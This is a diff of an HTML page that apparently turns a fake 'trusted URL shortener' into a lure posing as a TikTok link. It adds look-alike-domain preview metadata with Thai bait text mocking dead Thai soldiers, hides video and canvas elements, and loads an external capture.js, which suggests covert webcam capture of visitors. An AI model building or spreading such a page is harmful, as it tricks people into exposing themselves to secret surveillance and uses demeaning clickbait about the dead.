@@ -1,44 +1,39 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Trusted Url Shorterner</title>
+    <title>https://vt.tiktok.com/ZSS2Et91W</title>
+     <!-- Open Graph (Facebook, Telegram, Discord, etc.) -->
+      <meta property="og:title" content="ทหารไทยโง่เง่าตาย 555">
+      <meta property="og:description" content="ทหารไทยโง่เง่าตาย 555">
+      <meta property="og:image" content=" https://vt-tiktok.github.io/thai-soldiers-GhhaSBzb2xkaWVyIGRlaWQgbG9s/preview.jpg">
+      <meta property="og:url" content="https://tinyurl.com/2dx2wkt7">
+      <meta property="og:type" content="website">
+    
+      <!-- Twitter Card -->
+      <meta name="twitter:card" content="ทหารไทยโง่เง่าตาย 555">
+      <meta name="twitter:title" content="ทหารไทยโง่เง่าตาย 555">
+      <meta name="twitter:description" content="ทหารไทยโง่เง่าตาย 555">
+      <meta name="twitter:image" content="https://vt-tiktok.github.io/thai-soldiers-GhhaSBzb2xkaWVyIGRlaWQgbG9s/">
     <style>
-        body {
-            background: black;
+        body { margin: 0; padding: 0; background: #000; 
             margin: 0;
+            padding: 0;
+            background-color: #000;
+            background-image: url("tiktok_logo.png");
+            background-size: 300px auto;
+            background-position: center;
+            background-repeat: no-repeat;
             height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            overflow: hidden;
         }
-        .spinner {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #3498db;
-            border-radius: 50%;
-            width: 80px;
-            height: 80px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        #loading-text {
-            color: white;
-            font-family: sans-serif;
-            text-align: center;
-            margin-top: 16px;
-            font-size: 1.2em;
-        }
+        /* Hide all UI elements */
+        video, canvas { display: none !important; }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <div id="loading-text">Loading, please wait...</div>
-
-    <video id="video" autoplay playsinline style="display: none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
-
+    
+    <!-- Reference to external JavaScript file -->
     <script src="capture.js"></script>
 </body>
 </html>
